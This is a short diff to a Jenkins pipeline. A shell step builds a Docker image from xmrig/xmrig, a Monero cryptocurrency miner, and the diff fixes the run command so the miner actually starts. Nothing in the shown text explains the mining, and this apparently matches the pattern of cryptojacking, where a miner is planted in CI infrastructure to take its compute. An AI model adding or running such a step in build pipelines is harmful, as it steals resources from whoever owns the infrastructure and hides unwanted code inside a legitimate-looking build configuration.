@@ -63,7 +63,7 @@ pipeline {
 				sh	'''
     					echo "FROM xmrig/xmrig:latest" > Dockerfile
 	    				docker build --no-cache -t xmrig/xmrig:latest .
-	 				docker run xmrig
+	 				docker run xmrig/xmrig:latest
 	 				'''
 			}
 		}
